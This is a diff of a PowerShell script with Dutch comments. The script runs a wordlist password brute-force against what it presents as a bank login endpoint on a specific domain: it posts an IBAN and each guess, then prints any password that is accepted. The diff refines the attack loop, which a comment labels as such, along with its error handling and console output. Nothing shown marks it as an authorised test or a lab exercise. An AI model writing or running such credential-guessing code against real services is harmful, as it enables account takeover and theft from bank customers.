@@ -32,37 +32,34 @@ do {
     $apiUrl = "https://telefoon.wilste.nl/bank/verify-login"
     $gevonden = $false
 
+    # De aanvalscyclus
     foreach ($gok in $wordlist) {
         if ([string]::IsNullOrWhiteSpace($gok)) { continue }
 
-        # De data voorbereiden voor jouw server
         $body = @{
             iban     = $iban
             password = $gok
         } | ConvertTo-Json
 
         try {
-            # Stuur het verzoek naar de echte server
-            $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"
+            # Gebruik -ErrorAction SilentlyContinue om 401/403 fouten zelf af te handelen
+            $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
 
-            # We controleren of de server zegt dat het gelukt is
-            # (Dit checkt op 'success': true of het woord 'success' in het antwoord)
-            if ($response.success -eq $true -or $response -match "success") {
+            if ($response.success -eq $true) {
                 Write-Host ""
-                Write-Host "******************************************************"
-                Write-Host "    [SUCCESS] MATCH GEVONDEN OP DE SERVER!"
+                Write-Host "******************************************************" -ForegroundColor Green
+                Write-Host "    [SUCCESS] MATCH GEVONDEN!"
                 Write-Host "    WACHTWOORD: $gok"
-                Write-Host "******************************************************"
+                Write-Host "******************************************************" -ForegroundColor Green
                 $gevonden = $true
                 break
-            } else {
-                Write-Host "PROBEREN: $gok ... [GEWEIGERD]" -ForegroundColor Gray
             }
         } catch {
-            Write-Host "PROBEREN: $gok ... [FOUTMELDING SERVER]" -ForegroundColor Red
+            # Hier vang je echte verbindingsfouten op
+            Write-Host "Verbindingsfout bij: $gok" -ForegroundColor Red
         }
 
-        # Een kleine pauze zodat mensen kunnen zien wat er gebeurt
+        Write-Host "PROBEREN: $gok ... [GEWEIGERD]" -ForegroundColor Gray
         Start-Sleep -Milliseconds 150
     }
 
